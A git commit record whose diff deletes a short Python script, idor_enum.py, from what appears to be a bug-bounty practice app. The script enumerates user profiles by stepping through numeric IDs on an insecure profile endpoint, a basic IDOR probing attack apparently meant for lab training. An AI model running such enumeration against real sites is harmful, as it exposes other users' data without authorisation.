2baa71c206b82b6edefb207cdac1f95e0056a4f8
ded3y3 <126064258+cr00k3d3y3@users.noreply.github.com>
2025-06-10 23:52:58 -0400

    Delete BBHApp directory

--- BBHApp/SQLiPlayground/scripts/idor_enum.py
+++
@@ -1,8 +0,0 @@
-def enumerate_profiles(session, base_url, start_id=1, end_id=10):
-    for uid in range(start_id, end_id + 1):
-        url = f"{base_url}/user-profile-insecure?id={uid}"
-        response = session.get(url)
-        if "Username:" in response.text:
-            print(f"[+] ID {uid} - Profile Found")
-        else:
-            print(f"[-] ID {uid} - Not Found")
